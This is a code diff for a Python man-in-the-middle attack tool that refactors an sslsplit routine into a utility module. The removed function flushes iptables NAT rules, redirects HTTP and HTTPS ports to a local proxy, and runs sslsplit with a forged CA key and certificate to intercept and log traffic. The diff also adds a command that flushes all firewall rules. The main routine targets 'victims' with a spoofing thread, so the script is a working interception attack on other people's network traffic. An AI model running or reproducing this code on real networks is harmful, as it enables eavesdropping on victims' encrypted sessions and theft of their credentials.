@@ -3,23 +3,8 @@ import scapy.all as scapy
 import threading
 import time
 import os
-import shutil
 
-from utils import get_victims, trick
-
-LOG_DIR = 'log'
-
-
-def sslsplit():
-    os.system('iptables -t nat -F')
-    os.system(
-        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
-    os.system(
-        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
-    shutil.rmtree(LOG_DIR, ignore_errors=True)
-    os.makedirs(LOG_DIR)
-    os.system(
-        f'sslsplit ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -k ca.key -c ca.crt -l connection.log -S {LOG_DIR} > /dev/null 2>/dev/null')
+from utils import get_victims, trick, sslsplit, LOG_DIR
 
 
 def mitm():
@@ -42,6 +27,7 @@ def mitm():
 
 def main():
     ips = get_victims()
+    os.system('iptables -F')
     threads = list()
     threads.append(threading.Thread(target=trick, args=[ips]))
     threads.append(threading.Thread(target=sslsplit))
